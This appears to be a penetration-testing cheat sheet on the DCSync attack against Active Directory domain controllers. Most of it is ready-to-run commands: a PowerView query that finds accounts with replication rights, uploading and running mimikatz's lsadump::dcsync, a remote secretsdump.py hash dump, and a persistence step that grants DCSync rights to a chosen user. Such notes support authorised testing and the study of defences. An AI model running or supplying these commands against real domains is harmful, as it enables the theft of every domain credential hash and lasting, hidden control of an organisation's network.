# DCSync

# Overview
## Local Exploitation
- The initial foothold must be against a domain account with **domain replication privileges (MS-DRSR)**. 
- The attacker would upload `mimikatz` and run the DCSync command from the `lsadump` module, specifying the targeted domain and user account.

## Remote Exploitation
- The attacker would use `secretsdump.py` to query the  DCSync hashes.

# Tools Needed
- [mimikatz](https://github.com/gentilkiwi/mimikatz)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

# Exploitation
*Assumption is that the attacker has access to the system through winrm*

## Local
```powershell
# OPTIONAL ENUMERATION
## Check who has permission (PowerView)
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}

# Upload mimikatz
upload mimikatz.exe mimikatz.exe

# Run mimikatz
.\mimikatz.exe

## Inside mimikatz
lsadump::dcsync /domain:domain.local /user:user
```

## Remote
```bash
secretsdump.py -just-dc <user>:<password>@<ip> -outputfile dcsync_hashes
```

# Persistence
If you're a domain admin, you can give DCSync rights to any user with `PowerView`
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName <username> -Rights DCSync -Verbose
```

# References
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
